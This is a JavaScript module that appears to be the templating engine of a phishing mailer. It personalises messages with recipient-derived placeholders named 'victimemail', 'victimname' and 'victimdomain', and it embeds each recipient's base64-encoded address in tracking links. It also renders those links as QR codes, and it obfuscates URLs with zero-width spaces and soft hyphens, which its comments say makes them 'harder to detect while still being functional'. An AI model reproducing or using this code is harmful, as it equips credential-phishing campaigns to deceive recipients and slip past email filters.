const fs = require('fs');
const QRCode = require('qrcode');

// Arrays to store data loaded from files
let firstNames = [];
let lastNames = [];
let companyNames = [];
let linksArray = [];
let wordsArray = [];
let words1Array = [];

// Initialize index variables
let linkIndex = 0;
let wordIndex = 0;

// Function to load data from a text file into an array
function loadFromFile(fileName) {
    try {
        const data = fs.readFileSync(fileName, 'utf8');
        return data.split('\n').map(item => item.trim()).filter(item => item !== '');
    } catch (error) {
        console.error(`Error reading ${fileName}:`, error);
        return [];
    }
}

// Load data from text files into arrays when the module is required
function loadData() {
    firstNames = loadFromFile('fnames.txt');
    lastNames = loadFromFile('lnames.txt');
    companyNames = loadFromFile('companyNames.txt');
    linksArray = loadFromFile('links.txt'); // Preserving placeholders in links
    wordsArray = loadFromFile('words.txt'); // Preserving placeholders in words
    words1Array = loadFromFile('words1.txt'); // Preserving placeholders in words1
}

loadData(); // Load data immediately when the module is required

// Generate a random number of specified length
function generateRandomNumber(count) {
    return Math.floor(Math.random() * Math.pow(10, count)).toString().padStart(count, '0');
}

// Generate a random string of specified length and type (lowercase or uppercase)
function generateRandomString(count, type) {
    const chars = type === 'lower' ? 'abcdefghijklmnopqrstuvwxyz' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let randomString = '';
    for (let i = 0; i < count; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        randomString += chars.charAt(randomIndex);
    }
    return randomString;
}

// Function to translate common color names to hexadecimal codes
function translateColorNameToHex(colorName) {
    const colors = {
        black: '#000000',
        white: '#ffffff',
        red: '#ff0000',
        green: '#00ff00',
        blue: '#0000ff',
        yellow: '#ffff00',
        cyan: '#00ffff',
        magenta: '#ff00ff',
        blank: '#ffffff' // For convenience, map 'blank' to white
    };

    return colors[colorName.toLowerCase()] || colorName;
}

// Function to obfuscate a URL by inserting zero-width spaces and soft hyphens
// This makes the URL harder to detect while still being functional
function obfuscateUrlAdvanced(url) {
    if (!url || typeof url !== 'string') {
        return url;
    }
    
    // Characters used for obfuscation
    const ZERO_WIDTH_SPACE = '\u200B'; // Zero-width space (U+200B)
    const SOFT_HYPHEN = '\u00AD'; // Soft hyphen (U+00AD)
    
    try {
        // Parse the URL to separate protocol from the rest
        const urlObj = new URL(url);
        const protocol = urlObj.protocol + '//'; // Keep protocol intact (e.g., "https://")
        
        // Obfuscate only the hostname (domain) - but keep it minimal
        let obfuscatedHostname = '';
        for (let i = 0; i < urlObj.hostname.length; i++) {
            obfuscatedHostname += urlObj.hostname[i];
            if (i < urlObj.hostname.length - 1 && Math.random() > 0.5) {
                // Only insert one type of obfuscation character, not both
                if (Math.random() > 0.5) {
                    obfuscatedHostname += ZERO_WIDTH_SPACE;
                } else {
                    obfuscatedHostname += SOFT_HYPHEN;
                }
            }
        }
        
        // Obfuscate the pathname - minimal obfuscation
        let obfuscatedPath = '';
        for (let i = 0; i < urlObj.pathname.length; i++) {
            obfuscatedPath += urlObj.pathname[i];
            if (i < urlObj.pathname.length - 1 && Math.random() > 0.5) {
                if (Math.random() > 0.5) {
                    obfuscatedPath += ZERO_WIDTH_SPACE;
                } else {
                    obfuscatedPath += SOFT_HYPHEN;
                }
            }
        }
        
        // Obfuscate the search (query string) - minimal obfuscation
        let obfuscatedSearch = '';
        if (urlObj.search) {
            for (let i = 0; i < urlObj.search.length; i++) {
                obfuscatedSearch += urlObj.search[i];
                if (i < urlObj.search.length - 1 && Math.random() > 0.5) {
                    if (Math.random() > 0.5) {
                        obfuscatedSearch += ZERO_WIDTH_SPACE;
                    } else {
                        obfuscatedSearch += SOFT_HYPHEN;
                    }
                }
            }
        }
        
        // Reconstruct URL: protocol + obfuscated parts
        const obfuscatedUrl = protocol + obfuscatedHostname + obfuscatedPath + obfuscatedSearch;
        
        // For href attributes, use the obfuscated URL directly (browsers handle it)
        // But we need to ensure it's properly encoded for email clients
        // Use encodeURI which will encode special characters but preserve URL structure
        return encodeURI(obfuscatedUrl);
        
    } catch (e) {
        // If URL parsing fails, use a simpler approach
        // Find where protocol ends (e.g., "https://")
        const protocolMatch = url.match(/^([a-zA-Z][a-zA-Z\d+\-.]*:)\/\//);
        if (protocolMatch) {
            const protocol = protocolMatch[0]; // e.g., "https://"
            const restOfUrl = url.substring(protocol.length);
            
            // Obfuscate the rest - minimal obfuscation
            let obfuscated = '';
            for (let i = 0; i < restOfUrl.length; i++) {
                obfuscated += restOfUrl[i];
                if (i < restOfUrl.length - 1 && Math.random() > 0.5) {
                    if (Math.random() > 0.5) {
                        obfuscated += ZERO_WIDTH_SPACE;
                    } else {
                        obfuscated += SOFT_HYPHEN;
                    }
                }
            }
            
            // Return protocol + obfuscated rest, using encodeURI
            return protocol + encodeURI(obfuscated);
        }
        
        // Fallback: if no protocol found, obfuscate everything but use encodeURI
        let obfuscated = '';
        for (let i = 0; i < url.length; i++) {
            obfuscated += url[i];
            if (i < url.length - 1 && Math.random() > 0.5) {
                if (Math.random() > 0.5) {
                    obfuscated += ZERO_WIDTH_SPACE;
                } else {
                    obfuscated += SOFT_HYPHEN;
                }
            }
        }
        return encodeURI(obfuscated);
    }
}

// Replace placeholders in content with actual values based on recipient's information
async function replacePlaceholders(content, recipient) {
    if (typeof content !== 'string') {
        console.error('Content must be a string.');
        return ''; // Guard clause to handle non-string content safely
    }

    if (typeof recipient !== 'string') {
        console.warn('Recipient must be a string. Converting to string.');
        recipient = recipient.toString();
    }

    const domain = recipient.split('@')[1] || 'defaultdomain.com';
    const name = recipient.split('@')[0] || 'defaultname';
    const domainParts = domain.split('.') || ['default', 'com'];

    // Handle ##obfuscatelink(URL)## pattern - obfuscate URLs
    // This must be done BEFORE other placeholders are replaced so URL placeholders work
    content = content.replace(/##obfuscatelink\((.*?)\)##/g, (match, urlTemplate) => {
        // First replace any placeholders in the URL template
        let url = urlTemplate;
        
        // Replace basic placeholders that might be in the URL
        url = url.replace(/##victimb64email##/g, Buffer.from(recipient).toString('base64'));
        url = url.replace(/##victimemail##/g, recipient);
        url = url.replace(/##victimname##/g, name.charAt(0).toUpperCase() + name.slice(1));
        url = url.replace(/##victimdomain##/g, domain);
        url = url.replace(/##victimdomain1##/g, domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1));
        url = url.replace(/##victimdomain2##/g, domainParts[0].toUpperCase());
        url = url.replace(/##victimdomain3##/g, `${domainParts[0].charAt(0).toUpperCase()}${domainParts[0].slice(1)}.${domainParts[1].toUpperCase()}`);
        url = url.replace(/##victimdomain4##/g, domainParts[0].toLowerCase());
        
        // Replace dynamic placeholders
        url = url.replace(/##num(\d+)##/g, (_, count) => generateRandomNumber(parseInt(count)));
        url = url.replace(/##stringlower(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'lower'));
        url = url.replace(/##stringupper(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'upper'));
        
        // Now obfuscate the final URL
        return obfuscateUrlAdvanced(url);
    });

    // Check if content contains ##qrcode## placeholder
    let qrCodeDataUrl = '';
    let link = '';
    if (content.includes('##qrcode##')) {
        link = getNextLink(recipient);
        qrCodeDataUrl = await generateQRCodeDataUrl(link, 200); // Use default colors here
    }

    const placeholders = {
        '##date1##': new Date().toLocaleString('en-US', { timeZone: 'UTC' }),
        '##date##': new Date().toISOString(),
        '##date2##': new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        '##time##': getFormattedTime(true),
        '##time1##': getFormattedTime(false),
        '##time2##': getFormattedTime(true, 'GMT'),
        '##randomfname##': getRandomItemFromArray(firstNames),
        '##randomlname##': getRandomItemFromArray(lastNames),
        '##randomcompany##': getRandomItemFromArray(companyNames),
        '##victimb64email##': Buffer.from(recipient).toString('base64'),
        '##words##': getNextWord(wordsArray),
        '##words1##': getNextWord(words1Array),
        '##victimemail##': recipient,
        '##victimname##': name.charAt(0).toUpperCase() + name.slice(1),
        '##victimdomain##': domain,
        '##victimdomain1##': domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1),
        '##victimdomain2##': domainParts[0].toUpperCase(),
        '##victimdomain3##': `${domainParts[0].charAt(0).toUpperCase()}${domainParts[0].slice(1)}.${domainParts[1].toUpperCase()}`,
        '##victimdomain4##': domainParts[0].toLowerCase(),
        '##victimdomainlogo##': getDomainLogo(domain),
        '##link##': link || '',
        '##qrcode##': qrCodeDataUrl ? `<img src="${qrCodeDataUrl}" alt="QR Code">` : '',
    };

    // Replace num(count), stringlower(count), and stringupper(count) placeholders
    content = content.replace(/##num(\d+)##/g, (_, count) => generateRandomNumber(parseInt(count)));
    content = content.replace(/##stringlower(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'lower'));
    content = content.replace(/##stringupper(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'upper'));

    // Replace other placeholders
    Object.keys(placeholders).forEach(key => {
        const regex = new RegExp(key, 'g');
        content = content.replace(regex, placeholders[key]);
    });

    return content;
}

// Function to get a formatted time string
function getFormattedTime(includeSeconds, timeZone) {
    const options = { hour: '2-digit', minute: '2-digit' };
    if (includeSeconds) options.second = '2-digit';
    return new Date().toLocaleTimeString('en-US', { ...options, timeZone: timeZone || 'UTC' });
}

// Function to get a random item from an array
function getRandomItemFromArray(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Function to get the next word from an array in a circular manner
function getNextWord(array) {
    const word = array[wordIndex];
    wordIndex = (wordIndex + 1) % array.length; // Move to the next word, wrap around if needed
    return word;
}

// Function to get a domain logo representation (example implementation)
function getDomainLogo(domain) {
    if (domain.includes('microsoft.com')) {
        return 'Microsoft Logo';
    }
    return 'Generic Logo'; // Default logo for other domains
}

// Function to get the next link and replace placeholders in the link template
function getNextLink(recipient) {
    if (linksArray.length === 0) {
        console.error('No links found in the linksArray.');
        return '';
    }

    const linkTemplate = linksArray[linkIndex];
    let link = linkTemplate.replace('##victimb64email##', Buffer.from(recipient).toString('base64')).replace('##victimemail##', recipient);
    linkIndex = (linkIndex + 1) % linksArray.length; // Move to the next link, wrap around if needed
    return link;
}

// Function to generate a QR code for a given URL with size and color options
async function generateQRCodeDataUrl(url, size = 50, color = { dark: 'black', light: 'white' }) {
    if (!url) {
        console.error('No URL provided for QR code generation.');
        return '';
    }

    try {
        const darkColor = translateColorNameToHex(color.dark);
        const lightColor = translateColorNameToHex(color.light);

        const qrCodeDataUrl = await QRCode.toDataURL(url, {
            width: size,
            color: {
                dark: darkColor, // Color of the QR code
                light: lightColor // Background color of the QR code
            }
        });
        return qrCodeDataUrl; // Return the data URL for the QR code
    } catch (error) {
        console.error('Error generating QR code:', error);
        return '';
    }
}

// Function to generate a base64 encoded number of specified length
function generateBase64Number(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

module.exports = {
    replacePlaceholders,
    generateQRCodeDataUrl
};
